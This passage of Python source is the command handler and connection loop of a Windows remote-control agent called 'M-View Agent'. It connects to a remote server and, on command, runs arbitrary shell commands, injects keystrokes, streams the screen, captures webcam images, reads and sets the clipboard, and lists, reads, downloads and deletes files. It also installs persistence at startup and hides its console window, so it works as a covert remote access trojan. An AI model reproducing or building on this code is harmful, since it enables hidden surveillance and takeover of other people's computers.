                                "Enter": "enter", "Backspace": "backspace", "Tab": "tab",
                                "Escape": "esc", "Delete": "delete", "Insert": "insert",
                                "Home": "home", "End": "end", "PageUp": "pageup",
                                "PageDown": "pagedown", "ArrowUp": "up", "ArrowDown": "down",
                                "ArrowLeft": "left", "ArrowRight": "right",
                                "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5",
                                "F6":"f6","F7":"f7","F8":"f8","F9":"f9","F10":"f10",
                                "F11":"f11","F12":"f12", " ": "space",
                                "Control": "ctrl", "Alt": "alt", "Shift": "shift",
                                "Meta": "win",
                            }
                            pg_key = key_map.get(key, key.lower() if len(key)==1 else None)
                            if pg_key:
                                hotkey = []
                                if data.get("ctrl")  and key not in ("Control",): hotkey.append("ctrl")
                                if data.get("alt")   and key not in ("Alt",):     hotkey.append("alt")
                                if data.get("shift") and key not in ("Shift",):   hotkey.append("shift")
                                hotkey.append(pg_key)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg_key, _pause=False)
                        elif ktype == "up":
                            key_map2 = {"Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win"}
                            pg_key = key_map2.get(key, key.lower() if len(key)==1 else None)
                            if pg_key:
                                pyautogui.keyUp(pg_key, _pause=False)
                    except Exception as e:
                        log.warning(f"key_event error: {e}")

            elif tab == "ping":
                # Respond immediately so dashboard can measure latency
                sio.emit("ping_result", {"device_id": CONFIG["DEVICE_TOKEN"], "t": data.get("t")})

            elif tab == "monitor":
                # Start or stop screen stream
                action = data.get("action", "start")
                if action == "start":
                    self.streamer.start(
                        monitor=data.get("monitor", 1),
                        fps=data.get("fps", CONFIG["STREAM_FPS"]),
                        quality=data.get("quality", CONFIG["STREAM_QUALITY"]),
                    )
                else:
                    self.streamer.stop()

            elif tab == "system":
                # Start continuous system telemetry
                action = data.get("action", "start")
                if action == "start":
                    self.sys_monitor.start(interval=data.get("interval", 2))
                else:
                    self.sys_monitor.stop()

            elif tab == "system_snapshot":
                # One-shot system stats
                stats = self.sys_monitor.get_snapshot()
                sio.emit("system_stats_report", stats)

            elif tab == "disks":
                sio.emit("disks_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "disks":     self.sys_monitor.get_disk_list(),
                })

            elif tab == "network":
                sio.emit("network_report", {
                    "device_id":    CONFIG["DEVICE_TOKEN"],
                    "interfaces":   self.sys_monitor.get_network_interfaces(),
                })

            elif tab == "processes":
                procs = self.proc_mgr.list_processes()
                sio.emit("processes_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "processes": procs,
                    "count":     len(procs),
                })

            elif tab == "kill_process":
                result = self.proc_mgr.kill_process(int(data.get("pid", 0)))
                sio.emit("kill_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "start_process":
                result = self.proc_mgr.start_process(data.get("command", ""))
                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "shell":
                result = self.shell.execute(
                    data.get("command", "echo hello"),
                    shell_type=data.get("shell_type", "cmd"),
                )
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "file_list":
                path = data.get("path", "C:\\")
                result = self.files.list_directory(path)
                sio.emit("file_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "file_read":
                result = self.files.read_file(data.get("path", ""))
                sio.emit("file_read_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "file_download":
                result = self.files.download_file(data.get("path", ""))
                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "file_delete":
                result = self.files.delete_file(data.get("path", ""))
                sio.emit("file_delete_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "drives":
                sio.emit("drives_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "drives":    self.files.list_drives(),
                })

            elif tab == "webcam":
                result = self.webcam.capture(camera_idx=data.get("camera", 0))
                sio.emit("webcam_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "webcam_list":
                cameras = self.webcam.list_cameras()
                sio.emit("webcam_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cameras":   cameras,
                })

            elif tab == "clipboard_get":
                if CLIPBOARD_AVAILABLE:
                    content = pyperclip.paste()
                    sio.emit("clipboard_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   content[:4096],
                        "ts":        datetime.utcnow().isoformat(),
                    })

            elif tab == "clipboard_set":
                if CLIPBOARD_AVAILABLE:
                    text = data.get("text", "")
                    pyperclip.copy(text)
                    sio.emit("clipboard_set_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "success":   True,
                    })

            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action":    "lock_screen",
                    "success":   True,
                })

            elif tab == "sleep":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "sleep", "success": True})
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
                time.sleep(1)
                os.system("shutdown /s /t 10 /c \"M-View remote shutdown\"")

            elif tab == "restart":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
                time.sleep(1)
                os.system("shutdown /r /t 10 /c \"M-View remote restart\"")

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "abort_shutdown", "success": True})

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            else:
                log.warning(f"Unknown tab action: {tab}")

    # ── Connection Loop ───────────────────────────────────────────
    def run(self):
        log.info("M-View Agent v3.0 starting…")
        install_persistence()
        time.sleep(CONFIG["STARTUP_DELAY"])

        while True:
            try:
                if not self._connected:
                    log.info(f"Connecting to {CONFIG['SERVER_URL']}…")
                    self.sio.connect(
                        CONFIG["SERVER_URL"],
                        transports=["websocket"],
                        wait_timeout=15,
                    )
                    self.sio.wait()

            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection failed: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                self._connected = False
                self.streamer.stop()
                self.sys_monitor.stop()
                self.heartbeat.stop()

            # Exponential backoff
            log.info(f"Reconnecting in {self._reconnect_delay}s…")
            time.sleep(self._reconnect_delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])


# ════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Hide console window (redundant with --noconsole but safe)
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass

    agent = MViewAgent()
    agent.run()